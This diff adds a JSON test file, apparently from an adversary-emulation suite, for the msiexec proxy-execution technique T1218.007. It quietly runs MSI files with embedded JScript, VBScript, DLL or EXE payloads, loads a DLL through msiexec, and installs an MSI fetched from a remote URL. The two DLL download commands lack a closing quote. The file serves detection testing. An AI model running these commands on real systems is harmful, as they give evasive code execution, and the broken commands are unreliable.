@@ -1,0 +1,403 @@
+{
+  "attack_technique": "T1218.007",
+  "display_name": "Signed Binary Proxy Execution: Msiexec",
+  "atomic_tests": [
+    {
+      "name": "Msiexec.exe - Execute Local MSI file with embedded JScript",
+      "description": "Executes an MSI containing embedded JScript code using msiexec.exe",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "procedure": "#{msi_exe} /q /#{action} \"#{msi_payload}\""
+      },
+      "input_arguments": [
+        {
+          "arg_name": "msi_payload",
+          "description": "MSI file to execute",
+          "type": "path",
+          "default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_JScript.msi"
+        },
+        {
+          "arg_name": "msi_exe",
+          "description": "MSIExec File Path",
+          "type": "path",
+          "default": "c:\\windows\\system32\\msiexec.exe"
+        },
+        {
+          "arg_name": "action",
+          "description": "Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.",
+          "type": "string",
+          "default": "i"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "The MSI file must exist on disk at specified location (#{msi_payload})",
+          "prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi\" -OutFile \"#{msi_payload}\""
+        }
+      ],
+      "dependency_executor_name": "powershell",
+      "auto_generated_guid": "a059b6c4-e7d6-4b2e-bcd7-9b2b33191a04"
+    },
+    {
+      "name": "Msiexec.exe - Execute Local MSI file with embedded VBScript",
+      "description": "Executes an MSI containing embedded VBScript code using msiexec.exe",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "procedure": "#{msi_exe} /q /#{action} \"#{msi_payload}\""
+      },
+      "input_arguments": [
+        {
+          "arg_name": "msi_payload",
+          "description": "MSI file to execute",
+          "type": "path",
+          "default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_VBScript.msi"
+        },
+        {
+          "arg_name": "msi_exe",
+          "description": "MSIExec File Path",
+          "type": "path",
+          "default": "c:\\windows\\system32\\msiexec.exe"
+        },
+        {
+          "arg_name": "action",
+          "description": "Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.",
+          "type": "string",
+          "default": "i"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "The MSI file must exist on disk at specified location (#{msi_payload})",
+          "prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_VBScript.msi\" -OutFile \"#{msi_payload}\""
+        }
+      ],
+      "dependency_executor_name": "powershell",
+      "auto_generated_guid": "8d73c7b0-c2b1-4ac1-881a-4aa644f76064"
+    },
+    {
+      "name": "Msiexec.exe - Execute Local MSI file with an embedded DLL",
+      "description": "Executes an MSI containing an embedded DLL using msiexec.exe",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "procedure": "#{msi_exe} /q /#{action} \"#{msi_payload}\""
+      },
+      "input_arguments": [
+        {
+          "arg_name": "msi_payload",
+          "description": "MSI file to execute",
+          "type": "path",
+          "default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_DLL.msi"
+        },
+        {
+          "arg_name": "msi_exe",
+          "description": "MSIExec File Path",
+          "type": "path",
+          "default": "c:\\windows\\system32\\msiexec.exe"
+        },
+        {
+          "arg_name": "action",
+          "description": "Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.",
+          "type": "string",
+          "default": "i"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "The MSI file must exist on disk at specified location (#{msi_payload})",
+          "prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_DLL.msi\" -OutFile \"#{msi_payload}\""
+        }
+      ],
+      "dependency_executor_name": "powershell",
+      "auto_generated_guid": "628fa796-76c5-44c3-93aa-b9d8214fd568"
+    },
+    {
+      "name": "Msiexec.exe - Execute Local MSI file with an embedded EXE",
+      "description": "Executes an MSI containing an embedded EXE using msiexec.exe",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "procedure": "#{msi_exe} /q /#{action} \"#{msi_payload}\""
+      },
+      "input_arguments": [
+        {
+          "arg_name": "msi_payload",
+          "description": "MSI file to execute",
+          "type": "path",
+          "default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_EXE.msi"
+        },
+        {
+          "arg_name": "msi_exe",
+          "description": "MSIExec File Path",
+          "type": "path",
+          "default": "c:\\windows\\system32\\msiexec.exe"
+        },
+        {
+          "arg_name": "action",
+          "description": "Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.",
+          "type": "string",
+          "default": "i"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "The MSI file must exist on disk at specified location (#{msi_payload})",
+          "prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_EXE.msi\" -OutFile \"#{msi_payload}\""
+        }
+      ],
+      "dependency_executor_name": "powershell",
+      "auto_generated_guid": "ed3fa08a-ca18-4009-973e-03d13014d0e8"
+    },
+    {
+      "name": "WMI Win32_Product Class - Execute Local MSI file with embedded JScript",
+      "description": "Executes an MSI containing embedded JScript code using the WMI Win32_Product class",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "procedure": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "msi_payload",
+          "description": "MSI file to execute",
+          "type": "path",
+          "default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_JScript.msi"
+        },
+        {
+          "arg_name": "action",
+          "description": "Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.",
+          "type": "string",
+          "default": "Install"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "The MSI file must exist on disk at specified location (#{msi_payload})",
+          "prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi\" -OutFile \"#{msi_payload}\""
+        }
+      ],
+      "auto_generated_guid": "882082f0-27c6-4eec-a43c-9aa80bccdb30"
+    },
+    {
+      "name": "WMI Win32_Product Class - Execute Local MSI file with embedded VBScript",
+      "description": "Executes an MSI containing embedded VBScript code using the WMI Win32_Product class",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "procedure": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "msi_payload",
+          "description": "MSI file to execute",
+          "type": "path",
+          "default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_VBScript.msi"
+        },
+        {
+          "arg_name": "action",
+          "description": "Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.",
+          "type": "string",
+          "default": "Install"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "The MSI file must exist on disk at specified location (#{msi_payload})",
+          "prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_VBScript.msi\" -OutFile \"#{msi_payload}\""
+        }
+      ],
+      "auto_generated_guid": "cf470d9a-58e7-43e5-b0d2-805dffc05576"
+    },
+    {
+      "name": "WMI Win32_Product Class - Execute Local MSI file with an embedded DLL",
+      "description": "Executes an MSI containing an embedded DLL using the WMI Win32_Product class",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "procedure": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "msi_payload",
+          "description": "MSI file to execute",
+          "type": "path",
+          "default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_DLL.msi"
+        },
+        {
+          "arg_name": "action",
+          "description": "Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.",
+          "type": "string",
+          "default": "Install"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "The MSI file must exist on disk at specified location (#{msi_payload})",
+          "prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_DLL.msi\" -OutFile \"#{msi_payload}\""
+        }
+      ],
+      "auto_generated_guid": "32eb3861-30da-4993-897a-42737152f5f8"
+    },
+    {
+      "name": "WMI Win32_Product Class - Execute Local MSI file with an embedded EXE",
+      "description": "Executes an MSI containing an embedded EXE using the WMI Win32_Product class",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "procedure": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "msi_payload",
+          "description": "MSI file to execute",
+          "type": "path",
+          "default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_EXE.msi"
+        },
+        {
+          "arg_name": "action",
+          "description": "Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.",
+          "type": "string",
+          "default": "Install"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "The MSI file must exist on disk at specified location (#{msi_payload})",
+          "prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_EXE.msi\" -OutFile \"#{msi_payload}\""
+        }
+      ],
+      "auto_generated_guid": "55080eb0-49ae-4f55-a440-4167b7974f79"
+    },
+    {
+      "name": "Msiexec.exe - Execute the DllRegisterServer function of a DLL",
+      "description": "Loads a DLL into msiexec.exe and calls its DllRegisterServer function. Note: the DLL included in the \"bin\" folder is only built for 64-bit, so this won't work on a 32-bit OS.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "procedure": "#{msi_exe} /y \"#{dll_payload}\""
+      },
+      "input_arguments": [
+        {
+          "arg_name": "dll_payload",
+          "description": "DLL to execute that has an implemented DllRegisterServer function",
+          "type": "path",
+          "default": "PathToAtomicsFolder\\T1218.007\\bin\\MSIRunner.dll"
+        },
+        {
+          "arg_name": "msi_exe",
+          "description": "MSIExec File Path",
+          "type": "path",
+          "default": "c:\\windows\\system32\\msiexec.exe"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "The DLL must exist on disk at specified location (#{dll_payload})",
+          "prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/MSIRunner.dll -OutFile \"#{dll_payload}\""
+        }
+      ],
+      "dependency_executor_name": "powershell",
+      "auto_generated_guid": "0106ffa5-fab6-4c7d-82e3-e6b8867d5e5d"
+    },
+    {
+      "name": "Msiexec.exe - Execute the DllUnregisterServer function of a DLL",
+      "description": "Loads a DLL into msiexec.exe and calls its DllUnregisterServer function. Note: the DLL included in the \"bin\" folder is only built for 64-bit, so this won't work on a 32-bit OS.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "procedure": "#{msi_exe} /z \"#{dll_payload}\""
+      },
+      "input_arguments": [
+        {
+          "arg_name": "dll_payload",
+          "description": "DLL to execute that has an implemented DllUnregisterServer function",
+          "type": "path",
+          "default": "PathToAtomicsFolder\\T1218.007\\bin\\MSIRunner.dll"
+        },
+        {
+          "arg_name": "msi_exe",
+          "description": "MSIExec File Path",
+          "type": "path",
+          "default": "c:\\windows\\system32\\msiexec.exe"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "The DLL must exist on disk at specified location (#{dll_payload})",
+          "prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/MSIRunner.dll -OutFile \"#{dll_payload}\""
+        }
+      ],
+      "dependency_executor_name": "powershell",
+      "auto_generated_guid": "ab09ec85-4955-4f9c-b8e0-6851baf4d47f"
+    },
+    {
+      "name": "Msiexec.exe - Execute Remote MSI file",
+      "description": "Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution. The MSI executes a built-in JScript payload that launches powershell.exe.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "procedure": "#{msi_exe} /q /i \"#{msi_payload}\""
+      },
+      "input_arguments": [
+        {
+          "arg_name": "msi_payload",
+          "description": "MSI file to execute",
+          "type": "string",
+          "default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi"
+        },
+        {
+          "arg_name": "msi_exe",
+          "description": "MSIExec File Path",
+          "type": "path",
+          "default": "c:\\windows\\system32\\msiexec.exe"
+        }
+      ],
+      "auto_generated_guid": "44a4bedf-ffe3-452e-bee4-6925ab125662"
+    }
+  ]
+}
